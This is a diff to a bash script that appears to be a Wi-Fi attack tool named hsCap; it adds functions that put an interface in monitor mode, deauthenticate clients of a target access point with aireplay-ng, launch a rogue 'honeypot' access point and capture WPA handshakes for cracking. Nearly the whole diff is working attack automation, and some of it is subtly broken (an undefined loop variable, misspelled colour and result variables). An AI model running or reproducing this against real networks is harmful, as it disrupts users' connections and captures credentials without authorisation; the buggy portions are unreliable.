@@ -278,19 +278,19 @@ sleep 2
 echo -e $green"\n Capturing data and waiting for Handshake..."
 sniff &
 csv
-#HANDSHAKE1 
+handshake_aireplay
 ;;
 2)                                    
 echo -e $yellow "\n You have selected : "$blue"HONEYPOT ATTACK"
 echo -e $magenta "--------------------------------------------------"
 honeypot
-#ATAQUEHONEYPOT2
+honeypot_attack
 ;;
 3)                                   
 echo -e $yellow "\n You have selected : "$blue"HONEYPOT + AIREPLAY ATTACK"
 echo -e $magenta "--------------------------------------------------"
 honeypot
-#ATAQUEHONEYPOT
+honeypot_attack_0
 ;;
 esac
 else
@@ -298,6 +298,112 @@ echo -e $green" [[ OK ]] - MDK3 is already installed."
 echo -e $magenta "--------------------------------------------------"
 sleep 1 
 fi
+}
+
+honeypot_attack(){
+echo -e $magenta "\n ══════════════════════════════════════════════════"
+echo -e $green "              Creating Honeypot..."
+echo -e $magenta "══════════════════════════════════════════════════"
+echo -e $yellow""
+airmon-ng start $iface_str > /dev/null 2>&1
+sniff_1 &
+csv
+handshake_honeypot
+}
+
+honeypot_attack_0(){
+echo -e $magenta "\n ══════════════════════════════════════════════════"
+echo -e $green "              Creating Honeypot..."
+echo -e $magenta "══════════════════════════════════════════════════"
+echo -e $yellow""
+airmon-ng start $iface_str > /dev/null 2>&1
+sniff_1 &
+csv
+handshake_aireplay
+}
+
+honeypot_attack_1(){
+echo -e $magenta "\n ══════════════════════════════════════════════════"
+echo -e $green "              Creating Honeypot..."
+echo -e $magenta "══════════════════════════════════════════════════"
+echo -e $yellow""
+airmon-ng start $iface_str > /dev/null 2>&1
+sniff_1 &
+csv
+handshake_mdk3
+}
+
+handshake_aireplay(){
+thereis=""
+airodump_sniff=`ps -A | grep airodump-ng | grep -v grep`
+interval=20
+while [ ! "$airodump_sniff" = "" ]; do
+calc
+v=`cat Networks/"$essid ($split_bssid)"-01.csv | grep -v WPA | grep $bssid | awk -F ',' '{print $1}'| awk '{gsub(/ /,""); print}'` 
+howmany=`echo $v | wc -w`
+if [ "$v" = "" ]; then
+calc
+echo -e $blue"\r${TAB} Searching clients...\c"
+c=1
+while [ $c -le 25 ]; do
+echo -e " \c"
+sleep 0.05
+c=$((c+1))
+done
+else
+c=1
+while [ $c -le $howmany ]; do
+thereis=`echo $v | awk '{print $'$c'}'`
+client_mac=`echo -n $thereis | cut -c-8`
+echo -en $green"\r Deauthenticating client "$yellow"$thereis... \033[K"
+xterm -e aireplay-ng -R --ignore-negative-one -0 5 -a $bssid -c $thereis $iface_str
+c=$((c+1))
+done
+c=$interval
+while [ $c -ge 1 ]; do
+calc
+data=`cat ./Networks/"$essid ($split_bssid)"-01.csv | grep "WPA" | awk '{print $11}' FS=',' | awk '{gsub(/ /,""); print}'`
+if [[ $data -ne 0 ]]; then
+handshake=`aircrack-ng Networks/"$essid ($split_bssid)"-01.cap | grep $bssid | tail --bytes 14`
+fi
+if [ $c -eq 1 ]; then
+echo -e $blue"\r${TAB} Restarting attack in "$green" $c...   $yellow $handshake  \c"$green
+else
+if [ $c -lt 10 ]
+then
+echo -e $blue"\r${TAB} Restarting attack in "$green" $c...   $yellow $handshake  \c"$green
+else
+echo -e $blue"\r${TAB} Restarting attack in "$green" $c...   $yellow $handshake  \c"$green
+fi
+fi
+if [ "$handshake" = "(1 handshake)" ]; then
+echo -e $yellow
+break
+fi
+sleep 1
+c=$((c-1))
+done
+fi
+calc
+data=`cat ./Networks/"$essid ($split_bssid)"-01.csv | grep "WPA" | awk '{print $11}' FS=',' | awk '{gsub(/ /,""); print}'`
+if [[ $data -ne 0 ]]; then
+handshake=`aircrack-ng Networks/"$essid ($split_bssid)"-01.cap | grep $bssid | tail --bytes 14`
+fi
+if [ "$handshake" = "(1 handshake)" ]; then
+clear
+echo -e $magenta "\n\n--------------------------------------------------"
+echo -e $white"           "$grenn"HANDSHAKE ACHIEVED"$white" !!!"
+echo -e $magenta "--------------------------------------------------"
+wpaclean "handshake/$essid ($split_bssid).cap" "Networks/$essid ($split_bssid)-01.cap" > /dev/null 2>&1
+kill_processes
+handshake_path=`cd ./handshake ; readlink -f "$essid ($split_bssid).cap"`
+echo -e $yellow "\n\n You can found the Handshake in handshake folder\n"
+echo -e " Handshake path: "$green"$handshake_path"
+sleep 1
+echo -e $blue "\n Bye Bye...\n"
+break
+fi
+done
 }
 
 handshake_mdk3(){
@@ -373,6 +479,65 @@ fi
 done
 }
 
+handshake_honeypot(){
+interval=300
+thereis=""
+airodump_sniff=`ps -A | grep airodump-ng | grep -v grep`
+while [ ! "$airodump_sniff" = "" ]; do
+calc
+v=`cat Networks/"$essid ($split_bssid)"-01.csv | grep -v WPA | grep $bssid | awk -F ',' '{print $1}'| awk '{gsub(/ /,""); print}'` 
+howmany=`echo $v | wc -w`
+if [ "$v" = "" ]; then
+calc
+echo -e $blue"\r${TAB} Waiting for clients...\c"
+c=1
+while [ $c -le 25 ]; do
+echo -e " \c"
+sleep 0.05
+c=$((c+1))
+done
+else
+c=1
+while [ $c -le $howmany ]; do
+thereis=`echo $v | awk '{print $'$c'}'`
+client_mac=`echo -n $thereis | cut -c-8`
+echo -en $green"\r Launching Honeypot... \033[K""$green"
+c=$((c+1))
+done
+c=$interval
+while [ $Cc -ge 1 ]; do
+calc
+data=`cat ./Networks/"$essid ($split_bssid)"-01.csv | grep "WPA" | awk '{print $11}' FS=',' | awk '{gsub(/ /,""); print}'`
+if [[ $data -ne 0 ]]; then
+handshake=`aircrack-ng Networks/"$essid ($split_bssid)"-01.cap | grep $bssid | tail --bytes 14`
+fi
+if [ "$handshake" = "(1 handshake)" ]; then
+echo -e $yellow
+break
+fi
+done
+fi
+calc
+data=`cat ./Networks/"$essid ($split_bssid)"-01.csv | grep "WPA" | awk '{print $11}' FS=',' | awk '{gsub(/ /,""); print}'`
+if [[ $data -ne 0 ]]; then
+hands=`aircrack-ng Networks/"$essid ($split_bssid)"-01.cap | grep $bssid | tail --bytes 14`
+fi
+if [ "$handshake" = "(1 handshake)" ]; then
+clear
+echo -e $magenta "\n\n--------------------------------------------------"
+echo -e $white"           "$grenn"HANDSHAKE ACHIEVED"$white" !!!"
+echo -e $magenta "--------------------------------------------------"
+wpaclean "handshake/$essid ($split_bssid).cap" "Networks/$essid ($split_bssid)-01.cap" > /dev/null 2>&1
+kill_processes
+handshake_path=`cd ./handshake ; readlink -f "$essid ($split_bssid).cap"`
+echo -e $yellow "\n\n You can found the Handshake in handshake folder\n"
+echo -e " Handshake path: "$green"$handshake_path"
+sleep 1
+echo -e $blue "\n Bye Bye...\n"
+break
+fi
+done
+}
 
 honeypot(){
 echo -e ""$yellow"\n Select the encryption type for the Honeypot: \n"
@@ -400,17 +565,6 @@ echo -e $red" [[ ERROR ]] - Invalid option!"
 honeypot
 ;;
 esac
-}
-
-honeypot_attack_1(){
-echo -e $magenta "\n ══════════════════════════════════════════════════"
-echo -e $green "              Creating Honeypot..."
-echo -e $magenta "══════════════════════════════════════════════════"
-echo -e $yellow""
-airmon-ng start $iface_str > /dev/null 2>&1
-sniff_1 &
-csv
-handshake_mdk3
 }
 
 ###################################   --   hsCap   --   ###################################
@@ -442,7 +596,7 @@ echo -e $magenta "--------------------------------------------------\n"
 echo -e $green" Capturing data and waiting for the Handshake..."
 sniff &
 csv
-#HANDSHAKE1
+handshake_aireplay
 fi
 if [ "$attack" = 2 ]; then
 echo -e $yellow "\n\n You selected : "$blue"MDK3 ATTACK"
@@ -457,13 +611,13 @@ if [ "$attack" = 3 ]; then
 echo -e $yellow "\n\n You selected : "$blue"HONEY POT ATTACK"
 echo -e $magenta "--------------------------------------------------\n"
 honeypot
-#ATAQUEHONEYPOT2
+honeypot_attack
 fi
 if [ "$attack" = 4 ]; then
 echo -e $yellow "\n\n You selected : "$blue"HONEYPOT + AIREPLAY ATTACK"
 echo -e $magenta "--------------------------------------------------\n"
 honeypot
-#ATAQUEHONEYPOT
+honeypot_attack_0
 fi
 if [ "$attack" = 5 ]; then
 echo -e $yellow "\n\n You selected : "$blue"HONEYPOT + MDK3 ATTACK"
